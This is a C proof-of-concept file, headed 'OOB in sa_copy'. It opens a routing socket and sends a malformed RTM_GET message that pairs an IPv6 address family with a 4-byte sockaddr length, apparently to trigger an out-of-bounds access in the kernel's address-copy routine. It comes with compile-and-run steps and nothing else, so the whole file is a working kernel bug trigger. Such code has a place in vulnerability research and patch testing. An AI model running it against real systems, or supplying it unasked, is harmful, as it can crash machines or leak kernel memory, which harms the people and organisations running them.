/**
 * Brief: OOB in sa_copy
 * Usage:
 *		1. clang RouteSockOOB.c -o route_sock_oob
 *		2. ./route_sock_oob
 */
#include <arpa/inet.h>
#include <errno.h>
#include <net/route.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

typedef struct route_msg_s route_msg_t;
struct route_msg_s {
    struct rt_msghdr hdr;
    char data[0x1000];
};

int main() {
    int route_fd = socket(AF_ROUTE, SOCK_RAW, 0);
    if (route_fd < 0) {
        printf("[-] Create AF_ROUTE socket failed: %s\n", strerror(errno));
        return 0;
    }
    printf("[+] Create AF_ROUTE socket succeed, route_fd = 0x%x\n", route_fd);

    route_msg_t route_msg;
    size_t offset = 0;

    memset(&route_msg, 0, sizeof(route_msg));

    route_msg.hdr.rtm_type = RTM_GET;
    route_msg.hdr.rtm_version = RTM_VERSION;

    /* RTAX_DST(0)*/
/*#define RTAX_DST_LEN sizeof(struct sockaddr_in6)*/
#define RTAX_DST_LEN 4
    route_msg.hdr.rtm_addrs |= (1 << RTAX_DST);
    route_msg.data[offset] = RTAX_DST_LEN;
    route_msg.data[offset + 1] = AF_INET6;
    memset(&route_msg.data[offset + 2], 'A', RTAX_DST_LEN - 2);
    offset += RTAX_DST_LEN;

    offset += sizeof(struct rt_msghdr);
    route_msg.hdr.rtm_msglen = offset;

    ssize_t nsend = send(route_fd, &route_msg, route_msg.hdr.rtm_msglen, 0);

    return 0;
}
